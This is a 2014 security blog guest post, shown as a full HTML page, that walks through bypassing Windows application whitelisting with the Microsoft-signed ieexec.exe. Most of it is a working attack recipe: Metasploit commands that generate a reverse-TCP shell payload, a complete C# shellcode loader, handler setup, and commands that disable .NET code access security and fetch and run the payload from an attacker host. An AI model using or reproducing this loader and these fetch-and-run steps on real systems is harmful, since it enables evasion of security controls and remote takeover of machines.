<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
<head>
  <title>
    Application Whitelist Bypass using IEexec.exe // Room362
  </title>

  <link href="http://gmpg.org/xfn/11" rel="profile">
<meta http-equiv="content-type" content="text/html; charset=utf-8">


<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

<meta name="description" content="">
<meta name="keywords" content="">
<meta name="author" content="infosecsmith2">
<meta name="generator" content="Hugo 0.16" />

  <meta property="og:title" content="Application Whitelist Bypass using IEexec.exe" />
<meta property="og:description" content="" />
<meta property="og:type" content="website" />
<meta property="og:locale" content="en_US" />
<meta property="og:url" content="https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/" />


  
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/base-min.css">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/pure-min.css">
  
  
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/grids-responsive-min.css">
  
  

  <link rel="stylesheet" href="https://room362.com//css/redlounge.css">
  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
  <link href='//fonts.googleapis.com/css?family=Raleway:400,200,100,700,300,500,600,800' rel='stylesheet' type='text/css'>
  <link href='//fonts.googleapis.com/css?family=Libre+Baskerville:400,700,400italic' rel='stylesheet' type='text/css'>

  
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/touch-icon-144-precomposed.png">
  <link rel="shortcut icon" href="/favicon.png">

  
  <link href="" rel="alternate" type="application/rss+xml" title="Room362" />

    
  
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/styles/tomorrow-night-bright.min.css">
  
  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/highlight.min.js"></script>
  <script>hljs.initHighlightingOnLoad();</script>


  

  

  

  
</head>

<body>
	

	<div id="layout" class="pure-g">
    <div class="sidebar pure-u-1 pure-u-md-1-4">
  <div class="header">
    

	
	  <img src="/images/headshot_small.png" class="sidebarphoto">
	

    <h1 class="brand-title">Room362</h1>
    <h2 class="brand-tagline">Blatherings of a security addict</h2>

    <nav class="nav">
      <ul class="nav-list">
        <li class="nav-item"><span class="nav-item-separator">//</span><a href="https://room362.com/">Home</a></li>
        
          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/brandon/">Brandon</a></li>
        
          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/about/">About</a></li>
        
      </ul>
    </nav>

    
    <div class="social-buttons">
      
        
        <a href="/index.xml" target="_blank"><i class='fa fa-rss'></i></a>
        
      
        
        <a href="https://linkedin.com/in/mubix" target="_blank"><i class='fa fa-linkedin'></i></a>
        
      
        
        <a href="https://twitter.com/mubix" target="_blank"><i class='fa fa-twitter'></i></a>
        
      
      
    </div>
    

  </div>
</div>

	
	

    <div class="content pure-u-1 pure-u-md-3-4">
		<a name="top"></a>
		

		
			
		    <div id="toc" class="pure-u-1 pure-u-md-1-4">
				<small class="toc-label">Contents</small>
		   	 	<nav id="TableOfContents">
<ul>
<li>
<ul>
<li><a href="#guest-post-by-infosecsmith2-https-twitter-com-infosecsmith2">Guest post by <a href="https://twitter.com/infosecsmith2">@infosecsmith2</a></a></li>
</ul></li>
</ul>
</nav>
		    </div>
		    
	    
  		<section class="post">
            <h1 class="post-title">
              <a href="/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/">Application Whitelist Bypass using IEexec.exe</a>
            </h1>
            <h3 class="post-subtitle">
            	
            </h3>
            
            	<span class="post-date">
                	<span class="post-date-day"><sup>16</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Jan</span> <span class="post-date-year">2014</span>
            	</span>
            	
            
            	
            		<span class="post-author-single">By <a class="post-author"  target="">infosecsmith2</a></span>
            		




            	
            

			
			

			

			

            

<h2 id="guest-post-by-infosecsmith2-https-twitter-com-infosecsmith2">Guest post by <a href="https://twitter.com/infosecsmith2">@infosecsmith2</a></h2>

<p>There was a recent presentation at DerbyCon, entitled:</p>

<p><a href="http://www.youtube.com/watch?v=j-r6UonEkUw">Living Off the Land: A Minimalist’s Guide to Windows Post-Exploitation</a>
by Christopher Campbell &amp; Matthew Graeber</p>

<p>I highly recommend that you start with this presentation as it lays the foundation for this post.</p>

<p>The premise is, how can we maintain persistence in a corporate environment, using tools and defaults provided by the host OS we have compromised. This is a very important concept, given the shift in many organizations to an Application Whitelisting Defense model.</p>

<p>It is only a matter of time before time before you might encounter an Application Whitelisting Defense.</p>

<p>As a follow up to that presentation, I began exploring the binaries that ship by default with Windows.  That is where I stumbled across a binary in the C:\Windows\Microsoft.NET\Framework64\v2.0.50727 path.</p>

<p>The Executable is ieexec.exe. A write up is here: <a href="http://support.microsoft.com/kb/822485">http://support.microsoft.com/kb/822485</a></p>

<blockquote>
<p>“The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.”</p>
</blockquote>

<p>Excellent! So, now we just need to host our malicious binary , and call it from ieexec.exe.</p>

<p>This is great, since most Application Whitelisting Environments are going to “Trust” anything signed my Microsoft as a matter of convenience. IEexec.exe will download and execute our code for us, all under the trusted process.</p>

<p>So lets get started!</p>

<p><strong>Step 1.</strong> Prepare your Shellcode, or whatever malicious app you want. I compiled my executable using SharpDevelop, since it has less footprint than a full blown Visual Studio install.
From msfconsole:</p>

<pre><code>msf &gt; use windows/x64/shell/reverse_tcp
msf payload(reverse_tcp) &gt; set LHOST x.x.x.x
msf payload(reverse_tcp) &gt; set LPORT 443
msf payload(reverse_tcp) &gt; generate -t csharp
￼
byte[] buf = new byte[422] { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52...

 &lt;Snipped Full ShellCode for Brevity&gt;
</code></pre>

<p><strong>Step 2.</strong> Create the .NET wrapper application</p>

<pre><code class="language-csharp">using System; 
using System.Runtime.InteropServices; 
namespace native 
{ 
    class Program 
    { 
            private static UInt32 MEM_COMMIT = 0x1000; 
            private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; 
            private static UInt32 MEM_RELEASE = 0x8000; 

        public static void Main(string[] args) 
        { 
            // native function's compiled code 

            byte[] proc = new byte[] { 
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52... 
            
            //Edited ShellCode For Brevity 
            }; 

            UInt32 funcAddr = VirtualAlloc(0, (UInt32)proc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
            Marshal.Copy(proc, 0, (IntPtr)(funcAddr), proc.Length); 
            IntPtr hThread = IntPtr.Zero; 
            UInt32 threadId = 0; 

            // prepare data 

            PROCESSOR_INFO info = new PROCESSOR_INFO(); 
            IntPtr pinfo = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PROCESSOR_INFO))); 
            Marshal.StructureToPtr(info, pinfo, false); 
            
            // execute native code 

            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); 
            WaitForSingleObject(hThread, 0xFFFFFFFF); 

            // retrive data 

            info = (PROCESSOR_INFO)Marshal.PtrToStructure(pinfo, typeof(PROCESSOR_INFO)); 
            Marshal.FreeHGlobal(pinfo); 
            CloseHandle(hThread);
            VirtualFree((IntPtr)funcAddr, 0, MEM_RELEASE); 
        } 

        [DllImport(&quot;kernel32&quot;)] 
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); 

        [DllImport(&quot;kernel32&quot;)] 
        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType); 

        [DllImport(&quot;kernel32&quot;)] 
        private static extern IntPtr CreateThread( UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId ); 

        [DllImport(&quot;kernel32&quot;)] 
        private static extern bool CloseHandle(IntPtr handle); 

        [DllImport(&quot;kernel32&quot;)] 
        private static extern UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds ); 

        [DllImport(&quot;kernel32&quot;)] 
        private static extern IntPtr GetModuleHandle( string moduleName ); 

        [DllImport(&quot;kernel32&quot;)] 
        private static extern UInt32 GetProcAddress( IntPtr hModule, string procName ); 

        [DllImport(&quot;kernel32&quot;)] 
        private static extern UInt32 LoadLibrary( string lpFileName ); 

        [DllImport(&quot;kernel32&quot;)] 
        private static extern UInt32 GetLastError();
        
        [StructLayout(LayoutKind.Sequential)] 
        internal struct PROCESSOR_INFO 
        { 
            public UInt32 dwMax; 
            public UInt32 id0; 
            public UInt32 id1; 
            public UInt32 id2; 
            public UInt32 dwStandard; 
            public UInt32 dwFeature; 

            // if AMD 
            public UInt32 dwExt; 
        }
    } 
}
</code></pre>

<p>You will want to compile the exe for the target platform. In this case I am going for an x64 target. Also, you will want to compile for 2.0 or 3.5 Framework.</p>

<p><strong>Step 3.</strong> Host the Exe. For this example, I used Mongoose. Simple and Effective:</p>

<p><a href="http://code.google.com/p/mongoose/">http://code.google.com/p/mongoose/</a></p>

<p>By default Mongoose listens on port 8080. This is configurable. Simple place your compiled binary from step 2 into the same directory as Mongoose. Start Mongoose and you are almost ready to deliver your payload.</p>

<p><strong>Step 4.</strong> Setup your receiver:</p>

<pre><code>msf payload(reverse_tcp) &gt; use exploit/multi/handler
msf exploit(handler) &gt; set LHOST x.x.x.x
msf exploit(handler) &gt; set LPORT 443
msf exploit(handler) &gt; set PAYLOAD windows/x64/shell/reverse_tcp
msf exploit(handler) &gt; exploit -j
</code></pre>

<p><strong>Step 5.</strong> From the host that is protected via Whitelisting. Open 2 Command Prompts as administrator.</p>

<p><strong>CMD 1 Execute:</strong></p>

<pre><code>C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;caspol.exe -s off
</code></pre>

<p>￼
<strong>CMD 2 Execute:</strong></p>

<pre><code>C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;ieexec.exe http://x.x.x.x:8080/bypass.exe
</code></pre>

<p>There is some detail to unpack here, I can go over later, as to why we need to run caspol.exe. Here’s the behavior I saw in our experimentation with this.</p>

<p>Initial attempt to run our rogue binary fails, since it is unknown/untrusted/unapproved:</p>

<p><img src="/images/postimages/201401_whitelisting_1.png" alt="" /></p>

<p>Now, on the same host&hellip;</p>

<p><img src="/images/postimages/201401_whitelisting_2.png" alt="" /></p>

<p>Executes just fine!</p>

<p><img src="/images/postimages/201401_whitelisting_3.png" alt="" /></p>

<p>Its important to distinguish what this technique is and what it is not. This is not an exploit or vulnerability. Rather this is one way to execute arbitraty code in an Application Whitelisting Environment.</p>

<p><strong>Summary:</strong></p>

<p>In this document we learned that even if a host is in a mode where only trusted approved applications can run. IEexec.exe can be used in certain situations to circumvent a Whitelist, since it is likely a trusted binary, since it is signed by Microsoft.</p>

<p>Cheers,</p>

<p>=&gt; <a href="https://twitter.com/infosecsmith2">@infosecsmith2</a></p>

	
			

			

			
				<div class="paging">
					<span class="paging-label">More Reading</span>
					
					<div class="paging-newer">
						<span class="dark-red">Newer</span><span class="decorative-marker">//</span>
						<a class="paging-link" href="/post/2014/2014-01-18-attacker-ghost-stories-shmoocon-2014/">Attacker Ghost Stories - ShmooCon 2014</a>
		            </div>
		            

					
					<div class="paging-older">
						<span class="dark-red">Older</span><span class="decorative-marker">//</span>
			            <a class="paging-link" href="/post/2014/2014-01-13-installing-metasploit-community-edition-on-windows-8/">Installing Metasploit Community Edition on Windows 8</a>
		            </div>
		            
	            </div>
            
          </section>
          
          	<div id="disqus_thread"></div>
<script type="text/javascript">
    var disqus_shortname = 'room362';
    var disqus_identifier = 'https:\/\/room362.com\/post\/2014\/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe\/';
    var disqus_title = 'Application Whitelist Bypass using IEexec.exe';
    var disqus_url = 'https:\/\/room362.com\/post\/2014\/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe\/';

    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
          
        
      <div class="footer">
	<hr class="thin" />
	<div class="pure-menu pure-menu-horizontal pure-menu-open">
		<ul class="footer-menu">
		
			<li><a href="/about">About</a></li>
		
			<li><a href="/post">Blog</a></li>
		
		</ul>
	</div>

	<p>&copy; 2016. All rights reserved.</p>
</div>
    </div>
  </div>
	

	

  
</body>
</html>
